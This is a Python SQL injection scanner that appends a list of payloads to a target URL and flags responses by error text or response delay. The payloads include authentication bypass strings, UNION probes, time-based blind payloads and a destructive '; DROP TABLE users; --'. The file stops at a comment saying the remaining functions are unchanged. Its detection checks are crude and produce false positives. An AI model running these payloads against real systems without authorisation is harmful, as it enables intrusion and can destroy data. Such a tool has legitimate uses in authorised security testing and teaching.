import requests
import time
import argparse
from bs4 import BeautifulSoup
from urllib.parse import urljoin, quote
from colorama import Fore, Style, init
from datetime import datetime

# Initialize colorama
init()

# Function to print time with INFO label in the desired colors
def print_info(message):
    current_time = datetime.now().strftime("%H:%M:%S")
    print(f"{Fore.BLUE}[{current_time}]{Fore.YELLOW} [INFO] {Style.RESET_ALL}{message}")

# List of payloads for basic SQL injection tests
PAYLOADS = [
    "' OR 1=1 --",
    "' OR 'a'='a",
    "'; DROP TABLE users; --",
    "' UNION SELECT NULL, NULL --",
    "'; WAITFOR DELAY '0:0:5' --",  # Time-based payload for SQL Server
    "' AND SLEEP(5) --",  # Time-based payload for MySQL
]

# Function to perform a basic SQL injection test
def test_sqli(url, payload):
    try:
        # URL encode the payload to avoid parsing errors
        encoded_payload = quote(payload)
        print_info(f"Testing payload: {payload}")

        # Test with the payload appended to the URL
        response = requests.get(url + encoded_payload)
        
        # Check for response status or any indications of SQL injection
        if "error" in response.text.lower():
            print(f"Potential SQLi found using payload: {payload}")
            print(f"Response: {response.text[:200]}")  # Print the first 200 chars of response for context
        elif encoded_payload in response.url:
            print(f"Possible blind SQLi or URL injection: {payload}")
            return True
    except Exception as e:
        print(f"Error with the request: {e}")
    return False

# Function for time-based SQL injection testing (useful for Blind SQLi)
def time_based_sqli(url, payload, delay=5):
    try:
        # URL encode the payload to avoid parsing errors
        encoded_payload = quote(payload)
        print_info(f"Testing time-based payload: {payload}")
        
        start_time = time.time()
        response = requests.get(url + encoded_payload)
        elapsed_time = time.time() - start_time
        
        # If there's a noticeable delay, it's likely a time-based SQLi
        if elapsed_time > delay:
            print(f"Time-based SQLi detected: Payload caused delay of {elapsed_time:.2f}s")
            print(f"Response: {response.text[:200]}")
            return True
    except Exception as e:
        print(f"Error with the request: {e}")
    return False

# The rest of the functions remain unchanged...

